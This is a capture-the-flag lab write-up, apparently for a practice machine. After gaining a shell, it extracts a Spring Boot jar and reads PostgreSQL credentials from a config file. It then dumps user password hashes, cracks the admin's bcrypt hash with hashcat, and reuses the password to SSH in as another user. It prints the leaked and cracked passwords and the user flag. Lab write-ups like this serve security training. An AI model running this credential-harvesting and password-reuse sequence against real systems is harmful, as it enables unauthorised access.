Our shell places us in the `/app` directory, where we find a Java Archive file named `cloudhosting-0.0.1.jar`. We can extract it into `/tmp/app` using the `-d` flag with `unzip`, which specifies the destination directory.
```bash
$ ls

$ unzip -d /tmp/app cloudhosting-0.0.1.jar
```
![alt text](Images/ls.png)

Looking at the /tmp/app/BOOT-INF/classes/application.properties file, we see some database credentials.
```bash
$ cat /tmp/app/BOOT-INF/classes/application.properties
```
![alt text](Images/classes.png)

The file discloses the credentials postgres:Vg&nvzAQ7XxR , with which we can connect to the local PostgreSQL instance.
```bash
$ psql -h 127.0.0.1 -U postgres
```
![alt text](Images/PostGres.png)

Listing all the available databases, we observe the presence of the cozyhosting database.
```bash
$ \list
```
![alt text](Images/List.png)

We connect to the database by utilizing the \connect directive.
```bash
$ \connect cozyhosting
```

![alt text](Images/Connect.png)

After establishing a successful connection to the database, we can run the `\dt` command to display all the tables available in the database.
```bash
$ \dt
```
![alt text](Images/dt.png)

Next, we use a `SELECT` query to retrieve and display all the data stored in the `users` table.
```bash
$ select * from users;
```

![alt text](Images/Users.png)

Here, we have two password hashes: one for the user kanderson and the other for the user Admin . We use hashid to identify the hash type:

![alt text](Images/Type.png)

Given that these hashes originate from a Spring Boot web application, bcrypt is the most probable algorithm in use. We save the administrator’s hash to a file and attempt to crack it with Hashcat, using mode `3200` for bcrypt.

![alt text](Images/Bcrypt.png)

$ hashcat hashes -m 3200 /usr/share/wordlists/rockyou.txt

![alt text](Images/HashCat.png)

![alt text](Images/HashCat2.png)

We successfully cracked the hash and recovered the password `manchesterunited`.
```bash
$ cat /etc/passwd
```

![alt text](Images/Passwd.png)

![alt text](Images/Passwd2.png)

While reviewing the users on the system, we identify an account named `josh`. We can try using the previously recovered password to authenticate as the `josh` user.
```bash
$ ssh josh@10.129.229.88
```
![alt text](Images/SSH.png)

![alt text](Images/SSH2.png)

We successfully log in as the user `josh`. The user flag can be found at `/home/josh/user.txt`.

![alt text](Images/UserFlag.png)

```bash
User Flag → fa4c755278d572e760f88d2288b39236
```


[Back](README.md)